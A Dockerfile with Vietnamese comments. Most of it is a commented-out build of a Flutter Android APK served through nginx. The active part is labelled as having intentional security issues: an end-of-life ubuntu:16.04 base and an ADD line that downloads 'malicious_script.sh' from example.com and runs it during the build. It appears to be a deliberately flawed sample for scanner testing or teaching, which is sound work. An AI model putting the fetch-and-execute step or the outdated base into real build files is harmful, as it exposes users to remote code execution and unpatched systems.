# # Stage 1: Builder
# FROM --platform=linux/amd64 ubuntu:20.04 AS builder

# # Cài đặt các phụ thuộc cần thiết và Java 17
# RUN apt-get update && \
#     apt-get install -y bash curl file git unzip xz-utils zip libglu1-mesa wget && \
#     apt-get clean

# # Tải và cài đặt OpenJDK 17 từ AdoptOpenJDK
# RUN mkdir -p /usr/lib/jvm && \
#     wget -O /tmp/openjdk-17.tar.gz https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.8.1%2B1/OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz && \
#     tar -xzf /tmp/openjdk-17.tar.gz -C /usr/lib/jvm && \
#     mv /usr/lib/jvm/jdk-17.0.8.1+1 /usr/lib/jvm/jdk-17 && \
#     rm /tmp/openjdk-17.tar.gz

# # Thiết lập JAVA_HOME
# ENV JAVA_HOME=/usr/lib/jvm/jdk-17
# ENV PATH="$JAVA_HOME/bin:$PATH"

# # Clone Flutter repository
# RUN git clone https://github.com/flutter/flutter.git /usr/local/flutter

# # Thiết lập đường dẫn Flutter
# ENV PATH="/usr/local/flutter/bin:/usr/local/flutter/bin/cache/dart-sdk/bin:${PATH}"

# # Cài đặt Android SDK
# RUN mkdir -p /usr/local/android-sdk-linux/cmdline-tools && \
#     curl -o /tmp/commandlinetools.zip https://dl.google.com/android/repository/commandlinetools-linux-6858069_latest.zip && \
#     unzip /tmp/commandlinetools.zip -d /usr/local/android-sdk-linux/cmdline-tools && \
#     rm /tmp/commandlinetools.zip && \
#     mv /usr/local/android-sdk-linux/cmdline-tools/cmdline-tools /usr/local/android-sdk-linux/cmdline-tools/latest && \
#     yes | /usr/local/android-sdk-linux/cmdline-tools/latest/bin/sdkmanager --sdk_root=/usr/local/android-sdk-linux --licenses && \
#     /usr/local/android-sdk-linux/cmdline-tools/latest/bin/sdkmanager --sdk_root=/usr/local/android-sdk-linux "platform-tools" "platforms;android-33"

# # Thiết lập biến môi trường ANDROID_HOME
# ENV ANDROID_HOME=/usr/local/android-sdk-linux
# ENV PATH="$ANDROID_HOME/platform-tools:$ANDROID_HOME/cmdline-tools/latest/bin:$PATH"

# # Chuyển Flutter sang kênh stable
# RUN /usr/local/flutter/bin/flutter channel stable && \
#     /usr/local/flutter/bin/flutter upgrade

# # Thiết lập ứng dụng
# RUN mkdir /app
# COPY . /app
# WORKDIR /app
# RUN /usr/local/flutter/bin/flutter doctor
# RUN /usr/local/flutter/bin/flutter pub get
# RUN /usr/local/flutter/bin/dart run build_runner build --delete-conflicting-outputs
# RUN /usr/local/flutter/bin/flutter build apk

# # Stage 2: Run-time image
# FROM nginx:stable-alpine AS runner

# # Sao chép cấu hình Nginx (nếu cần)
# COPY default.conf /etc/nginx/conf.d

# # Sao chép file APK đã build vào thư mục Nginx
# COPY --from=builder /app/build/app/outputs/flutter-apk/app-release.apk /usr/share/nginx/html/app-release.apk

# CMD ["nginx", "-g", "daemon off;"]

# Dockerfile with intentional security issues
FROM ubuntu:16.04 

RUN apt-get update && apt-get install -y \
    curl \
    wget \
    vim \
    && rm -rf /var/lib/apt/lists/*

# Sử dụng lệnh COPY thay vì ADD để tránh nhầm lẫn
ADD http://example.com/malicious_script.sh /usr/local/bin/malicious_script.sh

RUN chmod +x /usr/local/bin/malicious_script.sh && /usr/local/bin/malicious_script.sh
